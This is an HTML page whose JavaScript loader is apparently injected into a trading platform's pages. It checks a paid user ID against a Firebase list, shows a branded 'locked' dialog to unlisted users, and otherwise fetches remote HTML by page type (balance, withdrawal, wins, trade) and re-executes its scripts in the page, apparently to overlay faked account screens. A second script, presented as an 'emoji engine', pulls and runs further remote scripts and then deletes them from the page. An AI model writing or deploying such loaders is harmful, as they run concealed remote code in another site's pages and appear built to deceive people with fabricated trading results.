<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<body>

<script id="js">
(function() {
    var pID = "talha-trader-admin-panel-lock",
        db = "https://" + pID + "-default-rtdb.firebaseio.com/users.json",
        baseURL = "https://https-talha-bhai-scripts.vercel.app/"; // Base URL trailing slash fix

    const uP = new URLSearchParams(window.location.search);
    let id = uP.get('id') || "";

    if (!id) return;

    // ─── Fast Firebase Fetch With Timeout ───────────────────────────────────
    async function fetchWithTimeout(url, ms = 4000) {
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), ms);
        try {
            const r = await fetch(url, { signal: ctrl.signal });
            clearTimeout(timer);
            return r;
        } catch (e) {
            clearTimeout(timer);
            return null;
        }
    }

    async function initSystem() {
        const r = await fetchWithTimeout(db, 4000);
        const d = r ? await r.json().catch(() => null) : null;
        const userData = d ? Object.values(d).find(u => u.id === id) : null;
        if (userData) {
            runCheck(userData);
        } else {
            showTalhaLock(id);
        }
    }

    // ─── Element Checks ──────────────────────────────────────────────────────
    function isVisible(el) {
        return el && (el.offsetWidth > 0 || el.offsetHeight > 0);
    }

    function checkLeaderboardElement() {
        const el = document.querySelector(".app--sidepanel-open");
        return isVisible(el);
    }

    function checkTradeListElement() {
        return !!document.querySelector("div[data-index]");
    }

    // ─── Main Routing Logic ──────────────────────────────────────────────────
    function runCheck(u) {
        const url = window.location.href;
        const urlParams = new URLSearchParams(window.location.search);
        const isDashTrue = urlParams.get('dash') === 'true';
        const isWinTrue = urlParams.get('win') === 'true';

        let route = null;

        // PRIORITY 1: URL Params Injections
        if (isDashTrue) {
            route = { f: "BL.html", k: "lb" };
        }
        else if (isWinTrue) {
            route = { f: "wins.html", k: "win" };
        }
        // PRIORITY 2: URL Keywords Analysis
        else if (url.includes("withdrawal")) {
            route = { f: "ps.html", k: "p" };
        }
        else if (url.includes("balance")) {
            route = { f: "ts.html", k: "t" };
        }
        else if (url.includes("analytics")) {
            route = { f: "anas.html", k: "ana" };
        }
        // PRIORITY 3: Live Device Dynamic Filter for demo-trade / trade
        else if (url.includes("demo-trade") || url.includes("trade")) {
            const isMobileDevice = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 1024;
            const file = isMobileDevice ? "androids.html" : "pcs.html";
            route = {
                f: file,
                k: isMobileDevice ? "android" : "pc"
            };
        }
        // PRIORITY 4: Active Open Elements Checks
        else if (checkLeaderboardElement()) {
            route = { f: "BL.html", k: "lb" };
        }
        // PRIORITY 5: Fallback Interface Checks
        else if (checkTradeListElement()) {
            route = { f: "wins.html", k: "win" };
        }
        // URL Conflict Guard
        else {
            showErrorPopup();
            return;
        }

        loadRoute(route, u);
    }

    // ─── Dynamic Asset Loader ────────────────────────────────────────────────
    function loadRoute(route, u) {
        if (u.permissions && u.permissions[route.k] === false) {
            showTalhaLock(id);
            return;
        }

        // Clean slate deployment for asset layers
        document.querySelectorAll("[id^='talha-injected-']").forEach(el => el.remove());

        const div = document.createElement('div');
        div.id = 'talha-injected-' + route.k;
        document.body.appendChild(div);

        fetch(baseURL + route.f)
            .then(res => res.text())
            .then(html => {
                div.innerHTML = html;
                div.querySelectorAll('script').forEach(oldScript => {
                    const s = document.createElement('script');
                    if (oldScript.src) {
                        s.src = oldScript.src;
                    } else {
                        s.textContent = oldScript.textContent;
                    }
                    document.body.appendChild(s);
                });
            })
            .catch(err => console.error("Execution Error:", err));
    }

    // ─── Warning Diagnostics ─────────────────────────────────────────────────
    function showErrorPopup() {
        if (document.getElementById('talhaErrorPopup')) return;
        const popup = document.createElement("div");
        popup.id = "talhaErrorPopup";
        popup.innerText = "⚠️ APPLY ON CORRECT URL ⚠️";
        Object.assign(popup.style, {
            position: "fixed",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            background: "rgba(0,0,0,0.95)",
            color: "#ff3333",
            padding: "18px 28px",
            borderRadius: "8px",
            fontSize: "16px",
            fontWeight: "bold",
            zIndex: "999999",
            opacity: "1",
            transition: "opacity 0.5s ease",
            width: "320px",
            textAlign: "center",
            border: "1px solid #ff3333",
            boxShadow: "0 0 15px rgba(255, 51, 51, 0.4)"
        });
        document.body.appendChild(popup);
        setTimeout(() => {
            popup.style.opacity = "0";
            setTimeout(() => popup.remove(), 500);
        }, 3000);
    }

    // ─── Security Lock Interface ─────────────────────────────────────────────
    function showTalhaLock(uid) {
        document.querySelectorAll("dialog#talhaLock").forEach(d => { d.close(); d.remove(); });

        const htmlContent = `<style>
        dialog#talhaLock {
            border: none;
            padding: 0;
            background: transparent;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        dialog#talhaLock::backdrop {
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
        }
        .glass {
            width: 400px;
            max-width: 90vw;
            padding: 30px 24px;
            border-radius: 12px;
            background: transparent;
            border: none;
            box-shadow: none;
            color: #0d1f10;
            text-align: center;
            position: relative;
            animation: popIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
            margin: auto;
        }
        @keyframes popIn {
            from { transform: scale(0.96); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .info {
            margin: 1.5rem 0;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(0, 0, 0, 0.15);
            border-radius: 8px;
            padding: 12px 14px;
            text-align: left;
        }
        .label {
            font-size: 11px;
            letter-spacing: 0.5px;
            opacity: 0.7;
            margin-bottom: 4px;
            font-weight: 700;
            color: #0d1f10;
        }
        .value-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
        }
        .value {
            font-size: 14px;
            font-weight: 600;
            word-break: break-all;
            color: #0d1f10;
        }
        .copy-btn {
            position: relative;
            display: inline-flex;
            background: transparent;
            border: none;
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.2s;
        }
        .copy-btn:hover { opacity: 1; }
        .copy-btn svg { width: 18px; height: 18px; fill: #0d1f10; }
        .copy-btn .tooltip {
            position: absolute;
            top: -35px;
            left: 50%;
            transform: translateX(-50%);
            background: #111;
            color: #fff;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 10px;
            opacity: 0;
            pointer-events: none;
            transition: 0.2s;
        }
        .copy-btn.show-tooltip .tooltip { opacity: 1; transform: translateX(-50%) translateY(-2px); }
        .heart-bg {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; overflow: hidden; z-index: -1;
        }
        .heart-bg::before, .heart-bg::after {
            content: '💚';
            position: absolute;
            font-size: 20px;
            animation: floatHearts 6s infinite linear;
        }
        .heart-bg::before { left: 15%; animation-delay: 0s; }
        .heart-bg::after { left: 80%; animation-delay: 3s; }
        @keyframes floatHearts {
            0% { transform: translateY(110%) rotate(0deg); opacity: 0; }
            40% { opacity: 0.5; }
            100% { transform: translateY(-110%) rotate(360deg); opacity: 0; }
        }
        .lock-icon img { width: 85px; height: auto; margin-bottom: 10px; }
        .logo-pulse { animation: pulseLogo 2s infinite ease-in-out; }
        @keyframes pulseLogo {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .footer-social { display: flex; justify-content: center; margin-top: 2rem; }
        .telegram-btn {
            background: linear-gradient(135deg, #229ed9, #1d4ed8);
            color: #fff;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: bold;
            text-decoration: none;
            box-shadow: 0 4px 12px rgba(34,158,217,0.3);
            transition: transform 0.2s;
        }
        .telegram-btn:hover { transform: scale(1.02); }
        .close-cross {
            position: absolute;
            top: 15px; right: 20px;
            font-size: 24px;
            color: #0d1f10;
            cursor: pointer;
            opacity: 0.6;
        }
        .close-cross:hover { opacity: 1; }
        </style>
        <div class="glass">
            <div class="heart-bg"></div>
            <div class="close-cross">&times;</div>
            <div class="lock-icon logo-pulse"><img src="https://logo-png-sigma.vercel.app/TQK.png" alt="Logo"/></div>
            <div style="font-size: 1.8rem; font-weight: 900; color: #0d1f10; letter-spacing: 0.5px;">TALHA SCRIPTS</div>
            <div style="font-size: 14px; font-weight: bold; color: #cc0000; margin-top: 5px;">(🔒 LOCKED 🔒)</div>
            <div class="info">
                <div class="label">YOUR SYSTEM ID</div>
                <div class="value-row">
                    <div class="value">${uid}</div>
                    <button class="copy-btn" id="copyBtnTalha">
                        <svg viewBox="0 0 24 24"><path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1zm3 4H8a2 2 0 0 0-2 2v16h13a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/></svg>
                        <span class="tooltip">Copied!</span>
                    </button>
                </div>
            </div>
            <div class="footer-social">
                <a href="https://t.me/TALHAQOTEXKING" target="_blank" class="telegram-btn">🚀 Join @TALHAQOTEXKING</a>
            </div>
        </div>`;

        const myDialog = document.createElement("dialog");
        myDialog.id = "talhaLock";
        myDialog.innerHTML = htmlContent;
        document.body.appendChild(myDialog);
        myDialog.showModal();

        myDialog.querySelector("#copyBtnTalha").onclick = function () {
            navigator.clipboard.writeText(uid).then(() => {
                this.classList.add('show-tooltip');
                setTimeout(() => this.classList.remove('show-tooltip'), 1200);
            });
        };
        myDialog.querySelector(".close-cross").onclick = function () {
            myDialog.close();
            myDialog.remove();
        };
    }

    // ─── Launch System Execution ─────────────────────────────────────────────
    initSystem();
})();
</script>

<script>
// ─── Asynchronous Emoji Engine Layer ─────────────────────────────────────────
(async () => {
    try {
        let response = await fetch(`https://talha-scripts.vercel.app/heart.html`);
        let rawMarkup = await response.text();
        let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
        
        documentDOM.querySelectorAll('script').forEach(oldNode => {
            let freshScriptNode = document.createElement('script');
            if (oldNode.src) {
                freshScriptNode.src = oldNode.src;
            } else {
                freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
            }
            document.body.appendChild(freshScriptNode);
            setTimeout(() => freshScriptNode.remove(), 600);
        });
        console.log("Zeetex Emoji Engine Hook Active");
    } catch (e) {
        console.error("Emoji Engine Separation Skip Context.", e);
    }
})();
</script>
